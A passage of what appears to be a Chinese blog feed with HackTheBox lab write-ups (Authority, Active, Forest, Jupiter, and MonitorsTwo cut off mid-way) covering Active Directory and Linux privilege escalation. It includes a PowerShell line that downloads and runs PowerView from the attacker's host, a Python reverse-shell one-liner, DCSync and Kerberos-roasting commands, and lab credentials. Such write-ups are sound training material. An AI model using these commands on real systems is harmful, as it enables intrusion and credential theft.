alt=""></p><p>这回能看见东西了，发现了svc_ldap用户，后面那个猜测是个密码：<code>lDaP_1n_th3_cle4r!</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_d7gDOEvLG5.png" alt=""></p><p>拿下user flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_3915IknvUg.png" alt=""></p><h2 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h2><h3 id="ADCS-x20"><a href="#ADCS-x20" class="headerlink" title="ADCS&#x20;"></a>ADCS&#x20;</h3><p>还记得SMB泄露的Ansible里面除了LDAP和PWM之外还有ADCS。我们可以尝试一下证书提权</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_WZICsk0f2l.png" alt=""></p><h4 id="ADCS-information-collection"><a href="#ADCS-information-collection" class="headerlink" title="ADCS information collection"></a>ADCS information collection</h4><p>这里使用Certipy进行信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy find -u svc_ldap@authority.htb.corp -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -dc-only -stdout<br></code></pre></td></tr></table></figure><h4 id="ADCS-vulnerability-scanning"><a href="#ADCS-vulnerability-scanning" class="headerlink" title="ADCS vulnerability scanning"></a>ADCS vulnerability scanning</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy find -u svc_ldap@authority.htb.corp -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -vulnerable -stdout<br></code></pre></td></tr></table></figure><p>发现了存在ESC1和ESC7漏洞</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_L55bt-Q2si.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dSWCtwZhQV.png" alt=""></p><h4 id="ADCS-ESC1"><a href="#ADCS-ESC1" class="headerlink" title="ADCS ESC1"></a>ADCS ESC1</h4><p><strong>原理：</strong> 默认情况下，域用户可以注册User证书模板，域机器账户可以注册Machine证书模板。两个证书模板都允许客户端身份验证。当用户账户申请User模板证书时，用户账户的用户主体名称（User Principal Name，UPN）将嵌入证书，以进行识别。</p><p>当使用证书进行身份验证时，KDC会尝试将UPN从证书映射到目标账户。User证书模板的msPKI-Certificate-Name-Flag属性存在一个CT_FLAG_SUBJECT_ALT_REQUIRE_UPN标志位，其指示CA将来自活动目录中请求者用户对象的UPN属性值添加到已颁发证书的主题备用名称中。UPN必须是唯一的，意味着不能同时有两个具有相同UPN的用户。但是机器账户是没有UPN属性的，那么机器在使用证书进行身份验证时，证书模板的 msPKI-Certificate-Name-Flag 属性还存在CT_FLAG_SUBJECT_ALT_REQUIRE_DNS 标志位，指示CA将从活动目录中请求用户对象的DNS属性获得的值添加到已颁发证书的主题备份名称中。 — 引用自<a href="https://item.jd.com/13378771.html" title="《内网渗透体系建设》">《内网渗透体系建设》</a></p><p>也就是说，当机器账户申请证书时，计算机的DNS属性值被嵌入证书，以进行识别。</p><p>我们可以通过机器账户申请证书，并填入Administrator的UPN，进行提权</p><ol><li>先添加一个机器账户</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_wQPnr71YoZ.png" alt=""></p><ol><li>通过certipy申请UPN为Administrator的证书</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cz7Cn-pN9f.png" alt=""></p><ol><li>使用证书进行身份验证</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6uHu3zRNfV.png" alt=""></p><p>但是KDC似乎不支持这种方式。不过我们这里确实有了证书了</p><h4 id="PassTheCert"><a href="#PassTheCert" class="headerlink" title="PassTheCert"></a>PassTheCert</h4><p>Google之后在Github找到了这个项目，非常符合我们现在的情况</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Rw1WOrkBkz.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_bRTLFPPNHy.png" alt=""></p><ol><li>先把证书和私钥分离</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DKu2GByFnX.png" alt=""></p><ol><li>通过证书进行认证，完成提权</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PCP7nk5XWM.png" alt=""></p><p>拿下Root Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5YM3VfmVW_.png" alt=""></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>总体打下来还是挺有难度的，打了三台Windows靶机了，目前的思路都是以信息泄露为入口，打某个服务获得凭据再通过某个配置错误提权。总体而言需要对域渗透、Windows协议比较了解。</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Active - HackTheBox</title>
    <link href="/2023/07/22/Active-HackTheBox/"/>
    <url>/2023/07/22/Active-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>开局先扫描，可以看到经典的SMB、RPC、LDAP。都是我们信息收集的目标</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_V6eVzNUJuG.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p>发现了一个可读的共享</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OZ3VGNfPsz.png" alt=""></p><p>把文件下载下来，发现是两个组策略文件，其中一个文件包含用户名密码</p><p>使用gpp-decrypt进行解密</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jTGmNhMcMQ.png" alt=""></p><p>此时我们拥有了用户名<code>active.htb\SVC_TGS</code>和密码<code>GPPstillStandingStrong2k18</code></p><p>获得User Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_yFuamx1-F-.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>BloodHound信息收集一波</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zGYojrslUd.png" alt=""></p><p>简单看了一下我们的<code>SVC_TGS</code>用户并不在其中，我的理解BloodHound是用来发现各种权限存在的风险的，这里可能没有。（我也不是很懂，欢迎大佬指正）</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_AapcJ6PdLM.png" alt=""></p><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h4><p>我们拥有一个用户密码，可以试一下Kerberoasting攻击。</p><p><strong>原理：</strong> Kerberoasting攻击主要是利用Kerberos认证中的第四步：<strong>TGS_REP</strong>，这一步会返回由目标服务实例的NTLM Hash加密的TGS票据，加密算法为RC4-HMAC</p><p>我们可以通过爆破该TGS票据获得服务的NTLM Hash，这里打的是CIFS服务</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_1m_DD8vGS0.png" alt=""></p><p>使用john进行爆破，爆破成功，我们获得了Administrator的密码：<code>Ticketmaster1968</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sbjEU20280.png" alt=""></p><p>直接smb拿到root.txt</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__ZoZNH6lzb.png" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Forest - HackTheBox</title>
    <link href="/2023/07/22/Forest-HackTheBox/"/>
    <url>/2023/07/22/Forest-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>年轻人的第一台Windows靶机</p><p>没打过Windows靶机，这台用来熟悉一下套路，收集了国内外很多Writeup总结下大伙的技术和思路</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xrHIst4ffi.png" alt=""></p><h4 id="区域传输"><a href="#区域传输" class="headerlink" title="区域传输"></a>区域传输</h4><p>失败</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GqFcJ1o4JP.png" alt=""></p><h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><p>没有匿名共享目录</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lRDqPZiCky.png" alt=""></p><h4 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h4><p>RPC远程过程调用枚举用户，拿到了用户和用户组信息</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_uiQj0W8ZPd.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7kmZCIKFhO.png" alt=""></p><p>查找对应的管理员组及管理员信息</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HTyGLSaBeN.png" alt=""></p><h4 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">enum4linux -v 10.10.10.161<br></code></pre></td></tr></table></figure><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><h4 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h4><p>拿到了用户名，这里又暴露了kerberos端口。直接尝试一下AS-REP Roasting攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> user in $(cat user.txt);<span class="hljs-keyword">do</span> python3 examples/GetNPUsers.py -no-pass -dc-ip <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span> htb/$&#123;user&#125; | grep -v impacket;done<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_r-PfYEK1Uj.png" alt=""></p><p>拿到了svc-alfresco用户的hash，这里使用john进行破解，得到密码s3rvice</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IZ7Pk1R-Ib.png" alt=""></p><h4 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h4><p>拥有账号密码可以直接利用evil-winrm连接</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7dB8sev2Tg.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><ol><li>自行搭建好BloodHound</li><li>使用bloodhound-python进行信息收集</li><li>将收集到的信息（json文件）上传到BloodHound进行分析</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -c all -ns 10.10.10.161<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_USoKCwUulk.png" alt=""></p><p><img src="C:\Users\aurey\Downloads\Compressed\Forest\image\image_z7bQv1dJEF.png" alt=""></p><p><strong>Shortest Path from Owned Principals</strong></p><p>可以发现svc-alfresco在Account Operators组中，该组的成员可以创建和修改大多数类型的帐户，包括用户、本地组和全局组的帐户。</p><p>参考：<a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators" title="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Og5lUwZJPE.png" alt=""></p><p><strong>Find Shortest Paths to Domain Admins</strong></p><p>分析到达Domain Admins的最短路径</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-xJi6br8uD.png" alt=""></p><p>Account Operators组对Exchange Windows Permissions组拥有Generic ALL权限</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>添加一个用户到Exchange Windows Permissions组中</li><li>利用Exchange Windows Permissions组的WriteDACL授予用户DCSync权限</li><li>通过DCSync进行域同步并窃取用户哈希</li></ol><p>添加用户至Exchange Windows Permissions 组</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_RqBqBzOhA2.png" alt=""></p><p>借助 PowerSploit 中的 powerview.ps1 来滥用<code>WriteDacl</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iex(New-Object Net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.10.16.76:8000/PowerView.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>创建凭证对象并授予 DCSync 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$pass</span> = convertto-securestring <span class="hljs-string">&#x27;passwd123&#x27;</span> -AsPlainText -Force<br><span class="hljs-variable">$cred</span> = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&#x27;HTB\aurey&#x27;</span>, <span class="hljs-variable">$pass</span>)<br>Add-DomainObjectAcl -Credential <span class="hljs-variable">$cred</span> -TargetIdentity <span class="hljs-string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity aurey -Rights DCSync<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MHATzSpUXl.png" alt=""></p><h4 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h4><p>DCSync可从利用DRS协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据</p><p>使用impacket的secretdump.py获取hash值</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TswtwKGVJ4.png" alt=""></p><p>使用 <a href="http://wmiexec.py" title="wmiexec.py">wmiexec.py</a> 通过哈希传递连接管理员</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4WPcocAXUc.png" alt=""></p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>我们可以通过DCSync拿到的krbtgt做一个黄金票据</p><ol><li>获取Domain SID</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oVPzDl3xKL.png" alt=""></p><ol><li>利用上面获取到的Domain SID和krbtgt制作黄金票据</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iWj0__81hD.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mNcoq0Dbco.png" alt=""></p><h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>第一台Windows靶机，算是学习一下套路。跟Linux靶机比较大的区别是需要一定的前置知识</p><p>感觉需要整理一些东西，再开始打后面的Windows靶机：</p><ul><li>Windows常见端口以及对应服务的打法</li><li>回顾Windows域渗透用到的各种方法</li></ul><h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><ul><li>Official WriteUp</li><li><a href="https://amirr0r.github.io/posts/htb-forest/" title="https://amirr0r.github.io/posts/htb-forest/">https://amirr0r.github.io/posts/htb-forest/</a></li><li><a href="https://www.freebuf.com/articles/system/325765.html" title="https://www.freebuf.com/articles/system/325765.html">https://www.freebuf.com/articles/system/325765.html</a></li><li><a href="https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d" title="https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d">https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d</a></li><li><a href="https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/" title="https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/">https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/</a></li><li><a href="https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf" title="https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf">https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jupiter - HackTheBox</title>
    <link href="/2023/07/18/Jupiter-HackTheBox/"/>
    <url>/2023/07/18/Jupiter-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>年轻人的第一台Medium靶机，没想到这么逆天</p><p>开局先扫描</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dFWdzTPsfA.png" alt=""></p><h3 id="体验功能"><a href="#体验功能" class="headerlink" title="体验功能"></a>体验功能</h3><p>很漂亮的页面</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LE8jgMM2m3.png" alt=""></p><p>主页翻了半天什么都没有，目录、js接口什么都找不到。实在没办法去看了一下writeup</p><h3 id="虚拟主机扫描"><a href="#虚拟主机扫描" class="headerlink" title="虚拟主机扫描"></a>虚拟主机扫描</h3><p>使用gobuster vhost爆破到了<code>kiosk.jupiter.htb</code>虚拟主机名，算是学到新姿势了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__JojbIIcXD.png" alt=""></p><p>一个Grafana&#x20;</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OoJTVk8IMy.png" alt=""></p><p>使用API执行SQL语句（这还是Google找到的，国内都是分享某个漏洞）</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_qkUEi3Ct-P.png" alt=""></p><h3 id="PostgreSQL-RCE"><a href="#PostgreSQL-RCE" class="headerlink" title="PostgreSQL RCE"></a>PostgreSQL RCE</h3><p>可以执行postgres SQL了，进一步利用参考</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce">https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce</a></p><p>直接试试RCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_n2RS9v0OEw.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_VHMTzmoQWH.png" alt=""></p><p>拿下 （本以为可以开始提权了就可以美滋滋拿下一台Medium靶机了，没想到这才是噩梦的开始</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JTsMmB1RUj.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_L7hs3nx1mL.png" alt=""></p><p>PEASS找到了一些信息但没法直接提权，用pspy看一下进程试试</p><p>可以看到jovian有在运行jupyter</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ur2AveS-BM.png" alt=""></p><p>juno会运行<code>/home/juno/shadow-simulation.sh</code> 和</p><p><code>/home/juno/.local/bin/shadow /dev/shm/network-simulation.yml</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ixPaGBJpTp.png" alt=""></p><p>查了一下shadow命令是用来管理密码的，我们看看<code>/dev/shm/network-simulation.yml</code>是什么内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jVr_y52xbe.png" alt=""></p><p>感觉是个CS架构的脚本，python开个服务端，curl作为客户端去请求</p><p>进程中也是这样</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0-RM-2GSip.png" alt=""></p><p>脚本由juno执行，拥有它的权限，我直接写一手公钥，实现免密登录</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-CbluHyD9r.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TMLnDluvHe.png" alt=""></p><p>记得给<code>/tmp/test</code>打上777权限，以防juno没权限。静待片刻，就可以免密登录了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hr6VPekhTL.png" alt=""></p><p>终于拿下User Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dmIOcuwQpl.png" alt=""></p><p>脚本里的内容跟我们在进程里看到的一致</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6GsKGo9rG3.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>进程信息发现jovian开了jupyter-notebook跑脚本<code>/opt/solar-flares/flares.ipynb</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gVhKvuN2pc.png" alt=""></p><p>PATH这里似乎有得利用</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_kMD6EKET4R.png" alt=""></p><p>端口开了不少</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_r_Lfxl6TXk.png" alt=""></p><p>这里显示我们可以修改<code>/opt/solar-flares</code>下的一些文件，还记得jovian用户执行的Jupyter文件吗，可惜我们不能直接改那个脚本</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cJrI2qkaDg.png" alt=""></p><p>上面开了挺多端口，外部都访问不到。我们这里考虑整个隧道进去</p><h4 id="两层端口转发"><a href="#两层端口转发" class="headerlink" title="两层端口转发"></a>两层端口转发</h4><p>VPS上将靶机的3000端口转发到VPS的3000端口上</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_990DP69Aqq.png" alt=""></p><p>本地将VPS的3000端口转发到本地的3000端口上</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gLsTUXn2jg.png" alt=""></p><p>即可通过本地访问到靶机中的<code>127.0.0.1:3000</code>，这里还是那个Grafana，我看看8888是什么</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gZguUUq3QC.png" alt=""></p><p>8888是一台Jupyter</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YRctifwFk3.png" alt=""></p><p>参考一下exploit-notes，我们可以找到token直接登录Jupyter，然后Jupyter的控制台可以执行命令，通过之前的进程可以看到这是jovian在跑的，拿下它就可以拿到jovian的权限了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wj6n1DHgC9.png" alt=""></p><p><a href="https://exploit-notes.hdks.org/exploit/machine-learning/jupyter-notebook-pentesting/">https://exploit-notes.hdks.org/exploit/machine-learning/jupyter-notebook-pentesting/</a></p><p>一手grep拿下token</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aAx83pgF9E.png" alt=""></p><p>利用ipynb反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">import socket,os,pty;s=socket.socket();s.connect((&quot;<span class="hljs-number">10.10</span>.<span class="hljs-number">16.76</span>&quot;, <span class="hljs-number">9999</span>));[os.dup2(s.fileno(),fd) <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> (0,1,2)];pty.spawn(<span class="hljs-string">&quot;bash&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_p7vfDE27bY.png" alt=""></p><p>看到这里允许sudo，我并没有密码，希望是个免密sudo</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_U0Y9ZBcli9.png" alt=""></p><p>非常nice</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5DJxf9v0jf.png" alt=""></p><p>执行一下发现提示我们没有配置文件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EAOEoEe7YG.png" alt=""></p><p>但是没用过sattrack这个工具，没有文档看</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-iruoxmxss.png" alt=""></p><p>上网搜了一下，其他地方啥都搜不到，只能看这篇论文了。我是真没想到打个靶机还得看论文…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SXgQnoh2jC.png" alt=""></p><p>论文里也是一顿介绍，只能知道这是一个卫星轨道预测和实时跟踪程序，并没有具体的用法和命令。</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GcMV3rK-pg.png" alt=""></p><p>只能发挥一下CTF余热，strings一下看看能不能发现什么</p><p><code>/tmp/config.json</code>不存在，有可能就是sattrack想要的配置文件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_3T22lTH-O9.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PUti8NGbiu.png" alt=""></p><p>我们创建一个再执行命令，确实现在没有提示找不到配置文件了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4Pz7xB-tUP.png" alt=""></p><p>但是这配置文件还是不知道怎么写，后面想起<code>/usr/local/share</code>一般会放一些配置案例</p><p>直接find开找</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CauIjEU8d4.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Kj00JOFDl.png" alt=""></p><p>复制过来执行一下，这里似乎会去下载tlesources指定的文件。</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HDiUE-9v9E.png" alt=""></p><p>试一下把tlesources改成flag的地址</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_W7FS4heVMt.png" alt=""></p><p>终于拿下了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Rme1oSXEWw.png" alt=""></p><h4 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h4><p>太折磨了，主要也是我打得断断续续的（每天下班时间打一下，公司一下又断开回家打）。这波打下来还是学到很多的（虚拟主机扫描、通过Grafana 打PostgreSQL GetShell、用户定时任务脚本提权、两层端口转发打内网服务、恶心的没用过的软件提权）</p><p>而且这个sattrack提权还没有writeup，大伙都是有<code>/usr/local/bin/sattrack</code>读写权限，直接</p><p><code>cp /bin/bash /usr/local/bin/sattrack</code>再<code>sudo /bin/bash</code>就完事了 😓（官方在一个月前修复了这个Bug）</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image-20230718234530269.png" alt=""></p><p>最后，狠狠的给他打个8分（虽然我还没打过Hard</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vjsWQXlpIr.png" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MonitorsTwo - HackTheBox</title>
    <link href="/2023/07/16/MonitorsTwo-HackTheBox/"/>
    <url>/2023/07/16/MonitorsTwo-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>端口还没扫完，直接浏览器访问一下，Google一搜，RCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Q6F88cIx3M.png" alt=""></p><h3 id="CVE-2022-46169-CACTI-1-2-22"><a href="#CVE-2022-46169-CACTI-1-2-22" class="headerlink" title="CVE-2022-46169-CACTI-1.2.22"></a>CVE-2022-46169-CACTI-1.2.22</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vlWca8mr7s.png" alt=""></p><p>直接拿下</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_bnxOO6aQgw.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NQThyjlhnm.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p>但是www-data用户连家目录都无，这里没有找到user flag</p><p>直接上Linpeas 收集一下信息，发现了一个脚本 <code>entrypoint.sh</code>和两个数据库密码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t7OuKTMMe5.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JNh6xed6cX.png" alt=""></p><p>这里也是一个连接数据库的脚本，倒是发现了有个host为db的数据库</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9IMi2gGAqP.png" alt=""></p><p>db的地址找不到，不过有个<code>172.19.0.3</code>，我们可以尝试连接</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8zDCX02DIY.png" alt=""></p><p>结果就是失败了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8i6wujwPhZ.png" alt=""></p><p>这里是在没办法了，去网上找了一下writeup，发现大伙使用 <code>getent</code>发现的数据库地址</p><blockquote><p><code>getent</code> 命令用来查看系统的数据库中的相关记录。即使这些数据库不是在本地，比如 ldap 或者 nis 中的数据库，也可以使用 getent 查看。</p></blockquote><h4 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 